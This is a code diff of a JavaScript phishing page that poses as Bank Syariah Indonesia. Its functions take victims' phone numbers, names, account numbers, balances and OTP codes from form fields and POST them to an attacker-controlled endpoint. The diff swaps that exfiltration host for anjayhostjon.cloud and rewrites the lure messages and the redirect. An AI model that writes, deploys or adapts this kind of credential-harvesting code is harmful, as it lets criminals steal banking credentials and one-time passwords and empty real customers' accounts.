@@ -15,7 +15,7 @@ var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱--
   var gabungan = "" + logo + '\n\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nohp.value + '</b>';
         
    $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/7h27g/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -43,7 +43,7 @@ var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱--
   var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value  ;
         
    $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/7h27g/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -79,7 +79,7 @@ function sendSaldo(){
   var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>';
         
    $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/7h27g/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -117,7 +117,7 @@ function sendOtp() {
  var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>' + '\n\n𝗢𝗧𝗣 • <b>' + sixpin.value + '</b>';
     
 $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/7h27g/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -132,12 +132,12 @@ setTimeout(function(){
        
       
     }, 2000);
-     $("#notif").text("- Kode Aktivasi sudah kadaluarsa -");
+     $("#notif").text("- id pelanggan salah -");
      $("#notif").css("color", "red");
         }
     });
       setTimeout(() => {
-     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Aktivasi,<br/>Silahkan klik tombol dibawah ini";
+     document.getElementById("notif").innerHTML = "Untuk mendapatkan id pelanggan,<br/>Silahkan klik tombol dibawah ini";
      $("#djload").hide();  
    $("#notif").css("color", "black");
  $("#sixpin").val("");
@@ -160,9 +160,9 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='wa';
-    }, 1000);
+location.href='https://anjayhostjon.cloud/BSI/7h27g/wa';
+    }, 5000);
     setTimeout(function(){
     $("#djload").hide();   
-    }, 1000);      
+    }, 5100);      
 }     
